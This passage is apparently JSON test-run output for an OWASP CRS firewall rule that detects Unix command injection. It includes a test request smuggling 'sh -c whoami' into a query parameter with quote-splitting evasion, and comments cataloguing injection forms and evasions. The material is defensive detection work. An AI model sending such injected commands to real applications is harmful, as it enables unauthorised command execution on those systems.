          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932230",
    "test_id" : 32,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932230.yaml",
    "description" : "System Command Injection test for BB finding 935E1D91 - time evasion attempt",
    "cause" : "failed expect_id check: 932230 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 32,
      "desc" : "System Command Injection test for BB finding 935E1D91 - time evasion attempt",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=ti''me+sh+-c+whoami",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932230 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932230,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Unix command injections."
        }, {
          "type" : "Comment",
          "text" : " A command injection takes a form such as:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   foo.jpg;uname -a"
        }, {
          "type" : "Comment",
          "text" : "   foo.jpg||uname -a"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The vulnerability exists when an application executes a shell command"
        }, {
          "type" : "Comment",
          "text" : " without proper input escaping/validation."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " To prevent false positives, we look for a 'starting sequence' that"
        }, {
          "type" : "Comment",
          "text" : " precedes a command in shell syntax, such as: ; | & $( ` <( >("
        }, {
          "type" : "Comment",
          "text" : " Anatomy of the regexp with examples of patterns caught:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 1. Starting tokens"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " ;        ;ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\{       {ifconfig}"
        }, {
          "type" : "Comment",
          "text" : " \\|       |ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\|\\|     ||ifconfig"
        }, {
          "type" : "Comment",
          "text" : " &        &ifconfig"
        }, {
          "type" : "Comment",
          "text" : " &&       &&ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\n       ;\\nifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\r       ;\\rifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\$\\(     $(ifconfig)"
        }, {
          "type" : "Comment",
          "text" : " \\$\\(\\(   $((ifconfig))"
        }, {
          "type" : "Comment",
          "text" : " \\$\\[     $[2+2]"
        }, {
          "type" : "Comment",
          "text" : " `        `ifconfig`"
        }, {
          "type" : "Comment",
          "text" : " \\${      ${ifconfig}"
        }, {
          "type" : "Comment",
          "text" : " <\\(      <( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " >\\(      >( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " \\(\\s*\\)  a() ( ifconfig; ); a"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 2. Command prefixes"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " {        { ifconfig }"
        }, {
          "type" : "Comment",
          "text" : " \\s*\\(\\s* ( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " \\w+=(?:[^\\s]*|\\$.*|\\$.*|<.*|>.*|\\'.*\\'|\\\".*\\\")\\s+   VARNAME=xyz ifconfig"
        }, {
          "type" : "Comment",
          "text" : " !\\s*     ! ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\$       $ifconfig"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 3. Quoting"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " '        'ifconfig'"
        }, {
          "type" : "Comment",
          "text" : " \\\"       \"ifconfig\""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 4. Paths"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [\\?\\*\\[\\]\\(\\)\\-\\|+\\w'\\\"\\./\\x5c]+/   /sbin/ifconfig, /s?in/./ifconfig, /s[a-b]in/ifconfig etc."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " An effort was made to combat evasions by shell quoting (e.g. 'ls',"
        }, {
          "type" : "Comment",
          "text" : " 'l'\"s\", \\l\\s are all valid). ModSecurity has a t:cmdLine"
        }, {
          "type" : "Comment",
          "text" : " transformation built-in to deal with this, but unfortunately, it"
        }, {
          "type" : "Comment",
          "text" : " replaces ';' characters and lowercases the payload, which is less"
        }, {
          "type" : "Comment",
          "text" : " useful for this case. However, emulating the transformation makes"
        }, {
          "type" : "Comment",
          "text" : " the regexp more complex."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is the base Rule to prevent Unix Command Injection"
        }, {
          "type" : "Comment",
          "text" : " for prefix + two and three characters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932230.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932230"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:7[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[arx][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?|(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z|c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[89][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?9|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?f|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|q[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|f[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[dg]|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s|q)|[kz][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|k[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z)|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?h|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n)|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:3[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m|c)|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|z)|y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|l[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:4[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?))(?:[\\s\\x0b&\\),<>\\|]|$).*|a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?-[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*)|g[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|(?:d[\\\"'\\)\\[\\x5c